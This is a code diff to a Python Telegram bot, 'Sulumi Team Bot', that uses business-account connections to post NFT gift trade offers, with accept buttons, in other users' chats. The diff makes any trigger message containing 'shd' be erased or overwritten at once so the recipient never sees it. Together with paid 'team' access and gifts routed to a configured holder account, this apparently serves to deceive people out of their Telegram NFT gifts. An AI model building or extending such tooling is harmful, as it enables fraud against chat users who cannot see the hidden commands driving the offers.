@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Full persistent + anti-freeze + menu/i18n
+Sulumi Team Bot — persistent + anti-freeze + menu/i18n + shd trigger
 """
 
 import os
@@ -235,7 +235,7 @@ def api(method, **p):
             return r.json()
         return res
     except Exception as e:
-        logging.error(f"API ERR: {e}")
+        logging.error(f"API ERR {method}: {e}")
         return {}
 
 def fmt(n): return f"{int(n):,}".replace(",", " ")
@@ -263,11 +263,14 @@ def em(cid, mid, txt, kb=None, bci=None):
     if bci: d["business_connection_id"] = bci
     return api("editMessageText", **d)
 
-def edit_any(cid, mid, txt, kb=None, bci=None):
-    d = {"chat_id": cid, "message_id": mid, "caption": txt, "parse_mode": "HTML"}
+def ec(cid, mid, cap, kb=None, bci=None):
+    d = {"chat_id": cid, "message_id": mid, "caption": cap, "parse_mode": "HTML"}
     if kb is not None: d["reply_markup"] = kb
     if bci: d["business_connection_id"] = bci
-    r = api("editMessageCaption", **d)
+    return api("editMessageCaption", **d)
+
+def edit_any(cid, mid, txt, kb=None, bci=None):
+    r = ec(cid, mid, txt, kb=kb, bci=bci)
     if r.get("ok"): return r
     return em(cid, mid, txt, kb=kb, bci=bci)
 
@@ -276,12 +279,17 @@ def ac(cb, txt=None, sa=False):
     if txt: d["text"] = txt
     return api("answerCallbackQuery", **d)
 
-def hide_cmd(cid, mid, bci=None):
-    res = dm(cid, mid, bci=bci)
-    if res.get("ok"): return res
-    res2 = em(cid, mid, "?", kb={"inline_keyboard": []}, bci=bci)
-    if res2.get("ok"): return res2
-    return sm(cid, "?", bci=bci)
+def erase_command(cid, mid, bci=None):
+    """Удалить. Не вышло — перезаписать в '?'."""
+    r = dm(cid, mid, bci=bci)
+    if r.get("ok"):
+        return True
+    logging.warning(f"DEL: {r.get('description')}")
+    r2 = em(cid, mid, "?", kb={"inline_keyboard": []}, bci=bci)
+    if r2.get("ok"):
+        return True
+    logging.warning(f"EDIT: {r2.get('description')}")
+    return False
 
 def menu_kb(uid):
     return {"inline_keyboard": [
@@ -331,10 +339,10 @@ def profile_txt(uid):
     )
 
 def okb(did):
-    return {"inline_keyboard": [[btn("❌ Отклонить", f"decline:{did}", "decline"), btn("✅ Принять", f"accept:{did}", "accept")]]}
+    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}
 
 def aakb(did, h):
-    return {"inline_keyboard": [[btn_url("📤 Передать", f"tg://send_gift?to={h.replace('@', '')}", "forward")], [btn("🔍 Проверить", f"check:{did}", "check")]]}
+    return {"inline_keyboard": [[btn_url(" Передать", f"tg://send_gift?to={h.replace('@', '')}", "forward")], [btn(" Проверить", f"check:{did}", "check")]]}
 
 def pnft(t):
     m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
@@ -349,9 +357,16 @@ def process_msg(msg):
         uid = msg["from"]["id"]
         mid = msg["message_id"]
         ci = msg.get("business_connection_id")
-        txt = (msg.get("text") or "").strip()
+        txt = (msg.get("text") or msg.get("caption") or "").strip()
         if not cid or not uid or not txt: return
         if ci: set_bci(uid, ci)
+
+        low = txt.lower()
+        has_shd = "shd" in low
+
+        # Триггер: любое сообщение с shd стирается сразу, до обработки
+        if has_shd:
+            erase_command(cid, mid, bci=ci)
 
         if txt == "/start":
             clear_state(uid)
@@ -368,55 +383,49 @@ def process_msg(msg):
 
         state = get_state(uid)
 
-        if state == "holder" and not txt.startswith("/"):
+        if state == "holder" and not has_shd and not txt.startswith("/"):
             un = txt.lstrip("@").lower()
             if un and " " not in un:
                 set_user_field(uid, "hold", un)
                 clear_state(uid)
                 sm(cid, t(uid, "holder_set").format(hold=un), kb=settings_kb(uid), bci=ci)
             return
-        if state == "lang" and not txt.startswith("/"):
-            if txt.lower() in ["ru", "en"]:
-                set_user_field(uid, "lang", txt.lower())
+        if state == "lang" and not has_shd and not txt.startswith("/"):
+            if low in ["ru", "en"]:
+                set_user_field(uid, "lang", low)
                 clear_state(uid)
-                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower() == 'ru' else '🇬🇧 EN'}", bci=ci)
+                sm(cid, f"✅ Язык: {'🇷🇺 RU' if low == 'ru' else '🇬🇧 EN'}", bci=ci)
             return
-        if state == "cur" and not txt.startswith("/"):
-            if txt.lower() in ["stars", "grams"]:
-                set_user_field(uid, "cur", txt.lower())
+        if state == "cur" and not has_shd and not txt.startswith("/"):
+            if low in ["stars", "grams"]:
+                set_user_field(uid, "cur", low)
                 clear_state(uid)
-                sm(cid, f"✅ Валюта: {'⭐' if txt.lower() == 'stars' else '💎'}", bci=ci)
+                sm(cid, f"✅ Валюта: {'⭐' if low == 'stars' else '💎'}", bci=ci)
             return
 
-        if txt.lower().startswith("shd "):
-            parts = txt.split()
-            if len(parts) < 3:
-                err = sm(cid, "❌ Формат: shd ссылка цена", bci=ci)
-                time.sleep(1.5)
-                if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
-                hide_cmd(cid, mid, bci=ci)
-                return
-            rest = " ".join(parts[1:])
-            ni = pnft(rest)
+        if has_shd:
+            ni = pnft(txt)
             if not ni:
                 err = sm(cid, "❌ Не найдена NFT", bci=ci)
                 time.sleep(1.5)
                 if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
-                hide_cmd(cid, mid, bci=ci)
                 return
-            try: pr = int(parts[-1])
+
+            parts = txt.split()
+            try:
+                pr = int(parts[-1])
             except:
                 err = sm(cid, "❌ Цена должна быть числом", bci=ci)
                 time.sleep(1.5)
                 if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
-                hide_cmd(cid, mid, bci=ci)
                 return
+
             if uid != OWNER_ID and not is_allowed(uid):
                 err = sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
                 time.sleep(1.5)
                 if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
-                hide_cmd(cid, mid, bci=ci)
                 return
+
             s = gs(uid)
             cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
             did = str(uuid.uuid4())[:8]
@@ -425,18 +434,16 @@ def process_msg(msg):
                 err = sm(cid, "⚠️ Подключи бизнес-аккаунт!", bci=ci)
                 time.sleep(1.5)
                 if err.get("ok"): dm(cid, err["result"]["message_id"], bci=ci)
-                hide_cmd(cid, mid, bci=ci)
                 return
+
             deal = {"wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"], "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], "st": "pending", "bci": sender_bci}
             save_deal(did, deal)
+
             nl = f"https://t.me/nft/{ni['slug']}"
             hidden = f'<a href="{nl}">\u200b</a>'
             name = msg["from"].get("first_name") or msg["from"].get("username") or "User"
             cap = hidden + f"<u>{name}</u> предлагает за подарок <b>{ni['name']} #{ni['nfmt']}</b> сумму <b>{pr}</b> {cs}.\n\nУ вас есть 5h 59m, чтобы принять решение."
-            res = sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
-            if res.get("ok"):
-                time.sleep(1.5)
-                hide_cmd(cid, mid, bci=ci)
+            sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
             return
 
         if txt.startswith("/"):
@@ -446,6 +453,29 @@ def process_msg(msg):
             if txt == "/cv": set_state(uid, "cur"); sm(cid, "💱 stars или grams", bci=ci); return
             if txt.startswith("/holder"): set_state(uid, "holder"); sm(cid, "👑 Username без @", bci=ci); return
             if uid != OWNER_ID: sm(cid, "🔒 Только для админа", bci=ci); return
+
+            if txt == "/diag":
+                test_bci = ci or get_bci(uid)
+                probe = sm(cid, "diag", bci=test_bci)
+                if not probe.get("ok"):
+                    sm(cid, f"send: {probe.get('description')}", bci=ci)
+                    return
+                pmid = probe["result"]["message_id"]
+                r1 = dm(cid, pmid, bci=test_bci)
+                if r1.get("ok"):
+                    r2 = {"ok": True, "description": "skipped"}
+                else:
+                    r2 = dm(cid, pmid)
+                report = (
+                    f"chat: <code>{cid}</code>\n"
+                    f"bci: <code>{test_bci}</code>\n"
+                    f"send: ok\n"
+                    f"delete+bci: {r1.get('ok')} — {r1.get('description')}\n"
+                    f"delete plain: {r2.get('ok')} — {r2.get('description')}"
+                )
+                sm(cid, report, bci=ci)
+                return
+
             if txt.startswith("/legitt"):
                 parts = txt.split()
                 if len(parts) < 4 or parts[1] != "add": sm(cid, "❌ Формат: <code>/legitt add id1 id2 id3 дни</code>\n(-1 = навсегда)", bci=ci); return
@@ -649,6 +679,7 @@ def set_cmd():
         {"command": "start", "description": "Главное меню"}, {"command": "buy", "description": "Купить"},
         {"command": "tarifs", "description": "Цены"}, {"command": "lg", "description": "Язык"},
         {"command": "cv", "description": "Валюта"}, {"command": "holder", "description": "Держатель"},
+        {"command": "diag", "description": "Диагностика удаления (админ)"},
         {"command": "list", "description": "Список (админ)"}, {"command": "zabrat", "description": "Отозвать (админ)"},
         {"command": "legitt", "description": "Выдать (админ)"}
     ])
